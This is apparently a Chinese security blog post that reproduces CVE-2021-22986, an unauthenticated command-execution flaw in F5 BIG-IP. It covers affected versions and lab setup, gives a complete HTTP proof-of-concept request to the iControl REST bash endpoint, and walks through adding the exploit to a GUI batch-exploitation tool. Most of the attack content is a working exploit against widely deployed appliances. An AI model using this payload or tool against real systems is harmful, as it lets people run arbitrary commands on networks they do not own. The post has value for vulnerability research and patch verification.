> 燕子来时新社，梨花落后清明。

## 0x01 漏洞描述

F5 BIG-IP 是美国 F5 公司的一款集成了网络流量管理、应用程序安全管理、负载均衡等功能的应用交付平台。

CVE-2021-22986 该漏洞允许未经身份验证的攻击者，通过BIG-IP管理界面和自身IP地址对iControl
REST接口进行网络访问，以执行任意系统命令，创建或删除文件以及禁用服务。

## 0x02 漏洞影响

F5 BIG-IP 16.0.0-16.0.1| F5 BIG-IP 12.1.0-12.1.5.2  
---|---  
F5 BIG-IP 15.1.0-15.1.2| F5 BIG-IQ 7.1.0-7.1.0.2  
F5 BIG-IP 14.1.0-14.1.3.1| F5 BIG-IQ 7.0.0-7.0.0.1  
F5 BIG-IP 13.1.0-13.1.3.5| F5 BIG-IQ 6.0.0-6.1.0  
  
## 0x03 漏洞复现

<https://login.f5.com/resource/registerEmail.do>注册好后，下载

[https://downloads.f5.com/esd/eula.sv?sw=BIG-IP&pro=big-ip_v16.x&ver=16.0.1&container=16.0.1_Virtual-Edition&path=&file=&B1=I+Accept](https://downloads.f5.com/esd/eula.sv?sw=BIG-IP&pro=big-ip_v16.x&ver=16.0.1&container=16.0.1_Virtual-Edition&path=&file=&B1=I+Accept)选择ova格式的，可以快速使用vm虚拟机打开，安装完后，用户名：root，密码：default，成功登陆后，输入config输入config
，几次回车即可看到当前ip，访问

![image-20210404113304697](https://image.3001.net/images/20210404/1617523477_60697315a93249cd77a84.png!small)

#### 3.1 使用POC攻击

    
    
    POST /mgmt/tm/util/bash HTTP/1.1  
    Content-Type: application/json  
    User-Agent: Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)  
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9  
    Accept-Encoding: gzip, deflate  
    Accept-Language: zh-CN,zh;q=0.9  
    Connection: close  
    Authorization: Basic YWRtaW46QVNhc1M=  
    X-F5-Auth-Token:   
    Host: 192.168.1.191  
    Content-Length: 39  
    ​  
    {"command":"run","utilCmdArgs":"-c id"}

![image-20210404111524871](https://image.3001.net/images/20210404/1617523479_60697317c122823c6a1a2.png!small)

## 0x04 利用工具编写

直接使用上次的[图形化漏洞利用工具](http://mp.weixin.qq.com/s?__biz=MzkzODIwMTIwNg==&mid=2247483987&idx=1&sn=2ee31ccbf8588c23e4184fcd3ab251f8&chksm=c2829b4af5f5125c563e437263eec4ebac08f32f2ace3e4bed9f5c8e562bac5299260b847c27#rd)编写

> 图形化漏洞利用工具已更新
>
> 项目地址：<https://github.com/yhy0/ExpDemo-JavaFX>
>
> V1.1
>
> 参考冰蝎的代理，添加代理设置，方便走burp调试
>
> 优化批量检查逻辑，使用接口，这样每次添加新的漏洞利用时，就不需要修改批量检查的逻辑。

在`src/main/java/com/yhy/core`下新建`CVE_2021_22986`类，实现`ExploitInterface`接口，并实现里面的函数，具体填充，直接将项目中的示例`CVE_2020_14882`的内容复制过去，修改一下内容，填充payload即可

![image-20210404113814410](https://image.3001.net/images/20210404/1617523482_6069731abd33605530460.png!small)

写完后，进入`src/main/java/com/yhy/core/Constants.java`和`src/main/java/com/yhy/tools/Tools.java`修改

![image-20210404132413838](https://image.3001.net/images/20210404/1617523486_6069731e407342e9a1914.png!small)

![image-20210404132702066](https://image.3001.net/images/20210404/1617523488_606973202dfa5a043783a.png!small)

运行即可。

![CVE-2021-22986](https://image.3001.net/images/20210404/1617523489_60697321e2adb3487109e.gif!small)

  

